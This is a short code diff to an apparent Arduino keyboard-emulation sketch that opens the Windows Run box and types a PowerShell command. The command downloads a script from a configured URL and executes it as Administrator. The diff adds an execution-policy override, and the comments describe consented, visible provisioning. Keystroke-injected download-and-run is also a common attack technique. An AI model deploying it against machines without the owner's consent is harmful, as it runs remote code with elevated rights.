@@ -100,13 +100,13 @@ void setup() {
   if (windows) {
     // Win+R opens a visible Administrator PowerShell; the person approves UAC.
     // Keep the command below the classic Run limit and the initial console open.
-    // Save the provisioning script to disk and respect the existing execution policy.
+    // Use RemoteSigned for this process only; enforced Group Policy still takes precedence.
     Keyboard.press(KEY_LEFT_GUI);
     Keyboard.press('r');
     delay(120);
     Keyboard.releaseAll();
     delay(1800);  // the Run box must be open before the text goes in
-    String cmd = String("powershell -NoExit -NoProfile -Command \"$p=$env:TEMP+'/ck.ps1';try{Invoke-WebRequest -UseBasicParsing ") + URL_PS + " -OutFile $p -ErrorAction Stop;& $p}catch{$_}\"";
+    String cmd = String("powershell -NoExit -NoProfile -ExecutionPolicy RemoteSigned -Command \"$p=$env:TEMP+'/ck.ps1';Invoke-WebRequest -UseBasicParsing ") + URL_PS + " -OutFile $p -ErrorAction Stop;& $p\"";
     led(1, 0, 0);
     typeText(cmd);
     // Run's Ctrl+Shift+Enter requests Administrator rights; UAC is approved by the person.
